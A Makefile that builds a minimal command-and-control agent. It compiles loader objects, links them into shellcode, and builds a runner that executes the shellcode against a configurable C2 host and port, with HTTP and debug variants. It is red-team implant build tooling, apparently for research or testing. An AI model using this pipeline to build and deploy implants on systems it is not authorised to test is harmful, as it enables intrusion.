# =============================================================================
# Basic Agent — Minimal Suture C2 Agent
# Connect → send "Hello from agent!" → disconnect.
# =============================================================================

ROOT := ..
include $(ROOT)/common.mk

.PHONY: all shellcode runner run debug http http-debug clean

all: shellcode runner

libs: $(BIN)
	$(call build_core_libs)

objects: $(BIN)
	@echo "[1/4] Compiling COFF objects [$(TRANSPORT)] ($(C2_HOST):$(C2_PORT))"
	$(call build_loader)
	@$(CC_64) -DWIN_X64 $(CFLAGS) -c pico_combined.c -o $(BIN)/basic_pico.x64.o
	@echo "    loader: $$(wc -c < $(BIN)/loader.x64.o)b  pico: $$(wc -c < $(BIN)/basic_pico.x64.o)b"

dll: $(BIN)
	$(call build_stub)

shellcode: libs objects dll
	@echo "[3/4] Crystal Palace link"
	@$(CPL) link loader.spec $(BIN)/stub.x64.dll $(BIN)/basic.x64.bin
	@echo "    Shellcode: $$(wc -c < $(BIN)/basic.x64.bin) bytes"

runner: $(BIN)
	$(call build_runner)

run: shellcode runner
	@echo "=== Running basic [$(TRANSPORT)] → $(C2_HOST):$(C2_PORT) ==="
	@$(BIN)/run.x64.exe $(BIN)/basic.x64.bin

debug: CFLAGS += -DAGENT_DEBUG
debug: shellcode runner

http: CFLAGS += -DTRANSPORT_HTTP
http: TRANSPORT := http
http: shellcode runner

http-debug: CFLAGS += -DAGENT_DEBUG -DTRANSPORT_HTTP
http-debug: TRANSPORT := http
http-debug: shellcode runner

server:
	@cd $(ROOT)/server && go build -o $(ROOT)/bin/server .

clean:
	rm -f $(BIN)/basic*.o $(BIN)/basic*.bin
